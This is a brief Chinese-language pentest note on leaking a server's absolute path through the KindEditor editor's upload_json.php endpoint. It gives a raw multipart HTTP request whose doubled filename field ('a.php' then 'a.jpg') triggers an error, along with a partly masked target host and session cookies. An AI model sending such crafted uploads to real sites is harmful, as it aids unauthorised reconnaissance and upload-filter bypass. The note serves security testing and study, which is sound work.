### Kindeditor编辑器 爆绝对路径

> 双写文件名触发报错
>  
>  
>     Content-Disposition: form-data ; name="imgFile";
> filename="a.php";filename="a.jpg"
>
>  
>
    
    
    POST /Public/main/js/kindeditor/php/upload_json.php HTTP/1.1  
    Host: jd.xx.s3136s.cn  
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36  
    Accept: application/json, text/javascript, */*; q=0.01  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Referer: http://xx.xxx  
    X-Requested-With: XMLHttpRequest  
    Content-Type: multipart/form-data; boundary=---------------------------333386876433742102273577814771  
    Content-Length: 80084  
    Origin: http://jd.cxx  
    Connection: close  
    Cookie: __jda=161763518.15862537027651894983383.1586253702.1586253702.1586314786.2; __jdv=161763518%7Cdirect%7C-%7Cnone%7C-%7C1586253702765; mba_muid=15862537027651894983383; shshshfp=63c759c83cea84f8cfaae5cff8c1b1f7; shshshfpa=97968ff6-169d-4c7f-d624-24070fdbfcd1-1586253708; PHPSESSID=4dt103soba9**n5e5n60gojbr4  
    ​  
    -----------------------------333386876433742102273577814771  
    Content-Disposition: form-data ; name="imgFile"; filename="a.php";filename="a.jpg"  
    Content-Type: application/octet-stream
    

  

![burp.png](https://image.3001.net/images/20200408/1586338466_5e8d9aa2329ae.png!small)

  
  
  

